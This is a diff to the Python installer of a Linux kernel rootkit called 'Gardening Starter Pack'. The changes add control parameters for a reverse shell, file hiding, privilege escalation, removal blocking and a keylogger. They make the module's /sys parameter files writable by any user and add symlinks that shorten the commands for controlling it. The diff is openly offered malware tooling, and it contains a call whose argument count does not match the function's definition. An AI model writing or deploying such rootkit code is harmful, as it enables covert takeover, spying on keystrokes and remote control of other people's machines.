@@ -8,6 +8,13 @@ from shutil import move
 from subprocess import STDOUT, PIPE, CalledProcessError, check_output, Popen
 
 #######
+# Globals
+#######
+
+# These must be identical to the parameters declared in rootkit/rootkit.c
+MODULE_PARAMS = ["rev_shell_ip", "hidden_file_prefix", "escalate_privileges", "block_removal", "keylogger"]
+
+#######
 # Prompting/Printing
 ######
 
@@ -42,7 +49,7 @@ def print_question(text):
 
 def print_help():
 	print("Gardening Starter Pack (Rootkit) Usage")
-	print("Written by Aaron Lichtman, Arch Gupta and Brandon Weidner.")
+	print("Written by Aaron Lichtman and Arch Gupta.")
 	print("\t--install\t\tinstall the rootkit.")
 	print("\t--uninstall\t\tuninstall the rootkit.")
 	print("\t-h \\ --help\t\tyou seem to have figured this one out already.")
@@ -148,6 +155,8 @@ def load_module(module_path, config):
 	REVERSE_SHELL_IP: The IP address the reverse shell will connect to.
 	HIDDEN_FILE_PREFIX: The prefix of files that will be hidden.
 	BLOCK_REMOVAL: Toggle for blocking the removal of the rootkit.
+
+	// TODO: Refactor to use PARAMS constant
 	"""
 	print_status("Loading module...")
 	options = ""
@@ -203,15 +212,38 @@ def remove_persistence(module_name):
 # Changing permissions on action toggles
 ####
 
+def get_all_param_files(driver_name, module_params):
+	return ["/sys/module/{}/parameters/{}".format(driver_name, param) for param in module_params]
+
+
 def update_permissions(driver_name):
 	"""
 	Makes it so that all kernel module parameter files can be written
 	to by any user.
 	"""
-	params = ["rev_shell_ip", "hidden_file_prefix", "escalate_privileges"]
-	files = ["/sys/module/{}/parameters/{}".format(driver_name, param) for param in params]
-	for file in files:
+	for file in get_all_param_files(driver_name, MODULE_PARAMS):
 		os.chmod(file, 0o777)
+
+
+def symlink_command_files(driver_name):
+	"""
+	Creates symlinks from all module parameter files to dest_dir/<PARAM>.
+	This lets us shorten a command from:
+	$ echo "$IP > /sys/module/garden/parameters/reverse_shell_ip
+	to $ echo "$IP > /garden/reverse_shell_ip
+	"""
+	for file in get_all_param_files(driver_name, MODULE_PARAMS):
+		param_name = file.split("/")[-1]
+		os.symlink(file, "{}/{}".format(driver_name, param_name))
+
+
+def cleanup_command_files(driver_name):
+	"""
+	Removes all symlinked files created in symlink_command_files().
+	"""
+	param_file_paths = get_all_param_files(driver_name, MODULE_PARAMS)
+	for param_name in [file.split("/")[-1] for file in param_file_paths]:
+		os.unlink("{}/{}".format(driver_name, param_name))
 
 
 ####
@@ -294,6 +326,7 @@ def install(kernel_version):
 	unload_module(config["MODULE_NAME"])
 	load_module(module_dest_path, config)
 	update_permissions(driver_name)
+	symlink_command_files(driver_name, config["MODULE_NAME"])
 	print_success("Successful installation.")
 
 
@@ -304,6 +337,7 @@ def uninstall():
 	print_status("Starting rootkit removal...")
 	module = prompt("Enter the name of the module to remove.", "garden")
 	remove_persistence(module)
+	cleanup_command_files(module)
 	unload_module(module)
 	print_success("Removed {} from modules.".format(module))
 
